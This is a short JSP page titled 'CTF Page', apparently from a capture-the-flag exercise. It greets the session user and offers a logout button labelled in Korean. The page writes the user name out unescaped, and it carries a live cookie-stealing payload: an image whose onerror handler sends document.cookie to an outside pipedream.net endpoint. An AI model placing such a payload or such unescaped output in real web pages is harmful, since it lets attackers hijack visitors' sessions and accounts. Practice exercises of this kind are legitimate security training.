<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>CTF Page</title>
    </head>
    <body>
        <h1>Hello, <%= session.getAttribute("userName") %></h1>
        <br />
        <form action="/hackthebox/ctflogout" method="POST">
            <input type="submit" value="로그아웃" name="logout" />
        </form>
        <img src="error.png" onerror="location.href='https://eodhhttu9beaqkb.m.pipedream.net?cookie='+document.cookie" />
    </body>
</html>
